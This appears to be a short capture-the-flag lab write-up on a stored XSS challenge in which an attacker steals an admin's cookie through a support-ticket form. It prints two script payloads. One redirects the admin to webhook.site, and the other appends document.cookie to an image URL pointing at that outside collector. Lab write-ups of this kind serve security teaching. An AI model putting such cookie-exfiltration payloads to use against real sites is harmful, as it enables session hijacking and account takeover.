# Challange

### In the challenge scenario, there is a support portal and an admin panel, and the objective is to steal the admin's cookie.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/7f520183-0616-4337-9e0c-80f99c846294) ![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/7867570c-235d-437b-bf59-5aa9cf2c6e86)

- In the ticket section, I utilized a payload `<script>window.location.href='<webhook site Url'</script>` that redirects the admin to `webhook.site`. This allows me to steal the admin's ID from the intercepted request on `webhook.site`.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/f496db1d-6f0f-43c2-a837-6c23cdb1b64c)

- Upon logging into the admin panel, an automatic redirection occurs, leading you to a specific URL.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/b624a414-c1e2-42cd-839d-665fd1510341)


- In this payload `<script> var i=new Image; i.src="<webhook.site URL>"+document.cookie;</script>`, I included code to fetch an image from a specified URL. This code also resulted in the cookies being exposed and displayed on the webhook site, allowing me to capture and analyze them.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/aacebd47-c6d6-457a-a767-af2680dd20f6)


- Upon inspecting the results in the webhook.site, we observed the captured information and data that was obtained through the payload and cookies.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/8663dae8-fa66-403f-9709-ec18a772742d)
